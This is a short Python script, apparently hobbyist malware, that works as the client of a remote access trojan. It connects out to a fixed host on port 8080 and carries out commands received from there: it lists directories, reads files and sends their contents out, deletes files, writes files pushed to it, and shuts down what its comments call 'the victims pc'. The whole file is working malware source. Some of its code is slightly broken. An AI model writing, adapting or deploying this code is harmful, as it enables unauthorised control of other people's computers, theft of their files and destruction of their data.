#Made by qpzux

#Commands:
#view_cwd - see all files in a directory
#custom_dir - view the contents of a directory
#download_file - downloads files from a directory
#remove_file - deletes a file that is selected by the path
#send_file - sends a file from one directory to another
#shutdown - shuts down the victims pc

import os
import socket

s = socket.socket()
port = 8080
host = "DESKTOP-55HG0FR"
s.connect((host, port))
print ("")
print ("Connected")
print ("")
while 1:
    command = s.recv(1024)
    command = command.decode()
    print ("Command received.")
    print ("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print ("Execution successful.")
        print ("")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print ("Execution successful.")
        print ("")

    elif command == "download_file":
        filepath = s.recv(5000)
        filepath = filepath.decode()
        file = open(filepath, "rb")
        data = file.read()
        s.send(data)
        print ("File has been sent.")
        print ("")

    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print ("File has been removed.")
        print ("")

    elif command == "send_file":
        filename = s.recv(6000)
        newfile = open(filename, "wb")
        data = s.recv(6000)
        newfile.write(data)
        newfile.close

    elif command == "shutdown":
        os.system("shutdown /s")
        print ("Command executed.")
        print ("")

    else:
        print ("Command not recognised.")
